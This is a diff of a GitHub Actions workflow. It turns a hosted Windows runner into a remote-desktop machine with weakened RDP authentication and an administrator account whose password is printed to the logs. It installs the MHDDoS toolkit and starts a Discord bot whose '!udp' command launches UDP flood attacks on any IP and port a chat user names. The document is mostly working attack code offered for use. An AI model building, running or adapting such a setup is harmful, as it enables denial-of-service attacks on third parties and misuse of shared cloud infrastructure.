@@ -1,82 +1,308 @@
-name: SSHX Session
+name: RDP
 
 on:
   workflow_dispatch:
 
 jobs:
-  sshx-session:
+  secure-rdp:
     runs-on: windows-latest
-    timeout-minutes: 3600  # 1 saat, gerekirse artır
+    timeout-minutes: 3600
 
     steps:
-      - name: Download and Extract SSHX
+      - name: Configure Core RDP Settings
         run: |
-          # ZIP'i S3'ten indir
-          $sshxUrl = "https://sshx.s3.amazonaws.com/sshx-x86_64-pc-windows-msvc.zip"
-          $zipPath = "$env:TEMP\sshx.zip"
-          $extractPath = "$env:TEMP\sshx"
+          # Enable Remote Desktop and disable Network Level Authentication
+          Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' `
+                             -Name "fDenyTSConnections" -Value 0 -Force
+          Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' `
+                             -Name "UserAuthentication" -Value 0 -Force
+          Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' `
+                             -Name "SecurityLayer" -Value 0 -Force
+
+          # Remove any existing rule with the same name
+          netsh advfirewall firewall delete rule name="RDP-Tailscale"
           
-          Write-Host "SSHX ZIP'ini indiriliyor..."
-          Invoke-WebRequest -Uri $sshxUrl -OutFile $zipPath
+          # Allow incoming connection on port 3389
+          netsh advfirewall firewall add rule name="RDP-Tailscale" `
+            dir=in action=allow protocol=TCP localport=3389
+
+          # Restart the Remote Desktop service
+          Restart-Service -Name TermService -Force
+
+      - name: Create RDP User with Secure Password
+        run: |
+          Add-Type -AssemblyName System.Security
+          $charSet = @{
+              Upper   = [char[]](65..90)      # A-Z
+              Lower   = [char[]](97..122)     # a-z
+              Number  = [char[]](48..57)      # 0-9
+              Special = ([char[]](33..47) + [char[]](58..64) +
+                         [char[]](91..96) + [char[]](123..126)) # Special characters
+          }
+          $rawPassword = @()
+          $rawPassword += $charSet.Upper | Get-Random -Count 4
+          $rawPassword += $charSet.Lower | Get-Random -Count 4
+          $rawPassword += $charSet.Number | Get-Random -Count 4
+          $rawPassword += $charSet.Special | Get-Random -Count 4
+          $password = -join ($rawPassword | Sort-Object { Get-Random })
+          $securePass = ConvertTo-SecureString $password -AsPlainText -Force
+          New-LocalUser -Name "RDP" -Password $securePass -AccountNeverExpires
+          Add-LocalGroupMember -Group "Administrators" -Member "RDP"
+          Add-LocalGroupMember -Group "Remote Desktop Users" -Member "RDP"
           
-          Write-Host "ZIP çıkarılıyor..."
-          New-Item -ItemType Directory -Path $extractPath -Force | Out-Null
-          Expand-Archive -Path $zipPath -DestinationPath $extractPath -Force
+          echo "RDP_CREDS=User: RDP | Password: $password" >> $env:GITHUB_ENV
           
-          Write-Host "Çıkarılmış dosyalar:"
-          Get-ChildItem $extractPath -Recurse
-          
-          # EXE dosyasını bul
-          $exePath = Get-ChildItem -Path $extractPath -Filter "*.exe" -Recurse | Select-Object -First 1
-          
-          if (-not $exePath) {
-              Write-Error "EXE dosyası bulunamadı!"
+          if (-not (Get-LocalUser -Name "RDP")) {
+              Write-Error "User creation failed"
               exit 1
           }
-          
-          Write-Host "EXE yolu: $($exePath.FullName)"
 
-      - name: Run SSHX and Show Output
+      - name: Install Tailscale
         run: |
-          $extractPath = "$env:TEMP\sshx"
-          $exePath = Get-ChildItem -Path $extractPath -Filter "*.exe" -Recurse | Select-Object -First 1
+          $tsUrl = "https://pkgs.tailscale.com/stable/tailscale-setup-1.82.0-amd64.msi"
+          $installerPath = "$env:TEMP\tailscale.msi"
           
-          Write-Host "`n==================================="
-          Write-Host "SSHX başlatılıyor..."
-          Write-Host "===================================`n"
-          
-          # SSHX'i çalıştır ve çıktıyı yakala (arka planda değil, doğrudan log'a yaz)
-          & $exePath.FullName
-          
-          # Eğer SSHX arka planda çalışıyorsa, process'i başlat ve bekle
-          # (SSHX muhtemelen URL üretip bekler, bu yüzden Start-Process kullan)
-          $process = Start-Process -FilePath $exePath.FullName -NoNewWindow -PassThru
-          
-          # Kısa bekleme ve ilk çıktı kontrolü
-          Start-Sleep -Seconds 10
-          
-          Write-Host "SSHX Process ID: $($process.Id)"
-          Write-Host "Çıktı log'larda görünecek (eğer varsa URL paylaşılır)"
+          Invoke-WebRequest -Uri $tsUrl -OutFile $installerPath
+          Start-Process msiexec.exe -ArgumentList "/i", "`"$installerPath`"", "/quiet", "/norestart" -Wait
+          Remove-Item $installerPath -Force
 
-      - name: Keep Session Active
+      - name: Establish Tailscale Connection
         run: |
-          Write-Host "`n=== SSHX SESSION AKTİF ==="
-          Write-Host "Workflow'u manuel olarak iptal et (Cancel) to terminate."
-          Write-Host "SSHX URL'si log'larda görünecek."
-          Write-Host "===========================`n"
+          # Bring up Tailscale with the provided auth key
+          & "$env:ProgramFiles\Tailscale\tailscale.exe" up --authkey=${{ secrets.TAILSCALE_AUTH_KEY }} --hostname=gh-runner-$env:GITHUB_RUN_ID
           
-          # Sonsuz döngü ile session'ı tut (her 5 dakikada log güncelle)
-          $outputFile = "$env:TEMP\sshx_output.log"
+          # Wait for Tailscale to assign an IP
+          $tsIP = $null
+          $retries = 0
+          while (-not $tsIP -and $retries -lt 10) {
+              $tsIP = & "$env:ProgramFiles\Tailscale\tailscale.exe" ip -4
+              Start-Sleep -Seconds 5
+              $retries++
+          }
+          
+          if (-not $tsIP) {
+              Write-Error "Tailscale IP not assigned. Exiting."
+              exit 1
+          }
+          echo "TAILSCALE_IP=$tsIP" >> $env:GITHUB_ENV
+      
+      - name: Verify RDP Accessibility
+        run: |
+          Write-Host "Tailscale IP: $env:TAILSCALE_IP"
+          
+          # Test connectivity using Test-NetConnection
+          $testResult = Test-NetConnection -ComputerName $env:TAILSCALE_IP -Port 3389
+          if (-not $testResult.TcpTestSucceeded) {
+              Write-Error "TCP connection to RDP port 3389 failed"
+              exit 1
+          }
+          Write-Host "TCP connectivity successful!"
+
+      - name: Install Python and Git
+        run: |
+          # Install Python
+          Invoke-WebRequest -Uri "https://www.python.org/ftp/python/3.10.0/python-3.10.0-amd64.exe" -OutFile "$env:TEMP\python-installer.exe"
+          Start-Process -FilePath "$env:TEMP\python-installer.exe" -ArgumentList "/quiet InstallAllUsers=1 PrependPath=1" -Wait
+          
+          # Install Git
+          Invoke-WebRequest -Uri "https://github.com/git-for-windows/git/releases/download/v2.33.1.windows.1/Git-2.33.1-64-bit.exe" -OutFile "$env:TEMP\git-installer.exe"
+          Start-Process -FilePath "$env:TEMP\git-installer.exe" -ArgumentList "/VERYSILENT" -Wait
+          
+          # Refresh PATH
+          $env:PATH = [System.Environment]::GetEnvironmentVariable("PATH", "Machine") + ";" + [System.Environment]::GetEnvironmentVariable("PATH", "User")
+
+      - name: Clone MHDDoS and Install Dependencies
+        run: |
+          # Create Desktop directory if it doesn't exist
+          if (-not (Test-Path "C:\Users\RDP\Desktop")) {
+              New-Item -ItemType Directory -Path "C:\Users\RDP\Desktop"
+          }
+          
+          # Clone MHDDoS
+          cd "C:\Users\RDP\Desktop"
+          git clone https://github.com/MHProDev/MHDDoS.git
+          
+          # Install requirements
+          cd MHDDoS
+          python -m pip install -r requirements.txt
+
+      - name: Create Discord Bot Script
+        run: |
+          $botCode = @"
+          import discord
+          import asyncio
+          import subprocess
+          import re
+          import os
+          import signal
+          from datetime import datetime
+          
+          # Bot token'ı buraya girin
+          BOT_TOKEN = "${{ secrets.DISCORD_BOT_TOKEN }}"
+          
+          # MHDDoS dizini
+          MHDDOS_PATH = "C:\\Users\\RDP\\Desktop\\MHDDoS"
+          
+          # Discord client'ı ayarla
+          intents = discord.Intents.default()
+          intents.message_content = True
+          client = discord.Client(intents=intents)
+          
+          # Aktif süreçleri takip etmek için
+          active_processes = []
+          
+          @client.event
+          async def on_ready():
+              print(f'Bot giriş yaptı: {client.user}')
+              print('------')
+              # Botun çalıştığını belirten bir mesaj gönder
+              channel = discord.utils.get(client.get_all_channels(), name="general")
+              if channel:
+                  await channel.send(f"✅ Bot aktif! {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
+          
+          @client.event
+          async def on_message(message):
+              # Botun kendi mesajlarını yok say
+              if message.author == client.user:
+                  return
+          
+              # Komut kontrolü
+              if message.content.startswith('!udp'):
+                  # Komut parametrelerini ayır
+                  parts = message.content.split()
+                  
+                  # Parametre sayısı kontrolü
+                  if len(parts) != 4:
+                      await message.channel.send("❌ Hatalı kullanım! Doğru format: `!udp IP PORT SÜRE`")
+                      return
+                  
+                  ip = parts[1]
+                  port = parts[2]
+                  duration = parts[3]
+          
+                  # IP adresi doğrulama
+                  if not re.match(r'^(\d{1,3}\.){3}\d{1,3}$', ip):
+                      await message.channel.send("❌ Geçersiz IP adresi formatı!")
+                      return
+                  
+                  # Port doğrulama
+                  try:
+                      port = int(port)
+                      if not (1 <= port <= 65535):
+                          raise ValueError
+                  except ValueError:
+                      await message.channel.send("❌ Port 1-65535 arasında olmalı!")
+                      return
+                  
+                  # Süre doğrulama
+                  try:
+                      duration = int(duration)
+                      if not (1 <= duration <= 300):
+                          raise ValueError
+                  except ValueError:
+                      await message.channel.send("❌ Süre 1-300 saniye arasında olmalı!")
+                      return
+          
+                  # Komutu oluştur
+                  command = [
+                      "python",
+                      "start.py",
+                      "udp",
+                      f"{ip}:{port}",
+                      "10000",  # Sabit paket hızı
+                      str(duration)
+                  ]
+          
+                  # MHDDoS dizinine geç
+                  original_dir = os.getcwd()
+                  os.chdir(MHDDOS_PATH)
+          
+                  try:
+                      # Komutu çalıştır
+                      process = await asyncio.create_subprocess_exec(
+                          *command,
+                          stdout=asyncio.subprocess.PIPE,
+                          stderr=asyncio.subprocess.PIPE
+                      )
+                      
+                      # Süreci listeye ekle
+                      active_processes.append(process)
+                      
+                      # Başlangıç mesajı
+                      await message.channel.send(
+                          f"✅ Saldırı başlatıldı!\n"
+                          f"🎯 Hedef: {ip}:{port}\n"
+                          f"⏱️ Süre: {duration} saniye\n"
+                          f"📦 Paket Hızı: 10000 pps"
+                      )
+                      
+                      # Çıktıları bekle (asenkron)
+                      stdout, stderr = await process.communicate()
+                      
+                      # Süreci listeden çıkar
+                      if process in active_processes:
+                          active_processes.remove(process)
+                      
+                      # Sonuçları kontrol et
+                      if process.returncode == 0:
+                          await message.channel.send("✅ Saldırı başarıyla tamamlandı!")
+                      else:
+                          error_msg = stderr.decode().strip() if stderr else "Bilinmeyen hata"
+                          await message.channel.send(f"❌ Saldırı sırasında hata oluştu:\n```\n{error_msg}\n```")
+                          
+                  except Exception as e:
+                      await message.channel.send(f"❌ Saldırı başlatılırken hata: `{str(e)}`")
+                  finally:
+                      # Orijinal dizine geri dön
+                      os.chdir(original_dir)
+          
+              # Tüm saldırıları durdur
+              elif message.content == '!stop':
+                  if not active_processes:
+                      await message.channel.send("❌ Aktif saldırı bulunamadı!")
+                      return
+          
+                  stopped_count = 0
+                  for process in active_processes:
+                      try:
+                          process.terminate()
+                          await process.wait()
+                          stopped_count += 1
+                      except:
+                          try:
+                              process.kill()
+                              await process.wait()
+                              stopped_count += 1
+                          except:
+                              pass
+                  
+                  # Listeyi temizle
+                  active_processes.clear()
+                  
+                  await message.channel.send(f"✅ {stopped_count} saldırı durduruldu!")
+          
+          # Botu başlat
+          client.run(BOT_TOKEN)
+          "@
+          
+          # Bot kodunu dosyaya yaz
+          $botCode | Out-File -FilePath "C:\Users\RDP\Desktop\discord_bot.py" -Encoding UTF8
+
+      - name: Start Discord Bot
+        run: |
+          # Botu başlat
+          Start-Process python -ArgumentList "C:\Users\RDP\Desktop\discord_bot.py" -NoNewWindow
+
+      - name: Maintain Connection
+        run: |
+          Write-Host "`n=== RDP ACCESS ==="
+          Write-Host "Address: $env:TAILSCALE_IP"
+          Write-Host "Username: RDP"
+          Write-Host "Password: $(echo $env:RDP_CREDS)"
+          Write-Host "==================`n"
+          
+          # Keep runner active indefinitely (or until manually cancelled)
           while ($true) {
-              # Sürekli SSHX çıktısını kontrol et ve log'a yaz (eğer dosya varsa)
-              if (Test-Path $outputFile) {
-                  $latest = Get-Content $outputFile -Tail 5
-                  if ($latest) {
-                      Write-Host "Son SSHX Çıktısı:"
-                      $latest | ForEach-Object { Write-Host $_ }
-                  }
-              }
-              
-              Write-Host "[$(Get-Date)] Session aktif - İptal et to close"
-              Start-Sleep -Seconds 300  # 5 dakika
+              Write-Host "[$(Get-Date)] RDP Active - Use Ctrl+C in workflow to terminate"
+              Start-Sleep -Seconds 300
           }
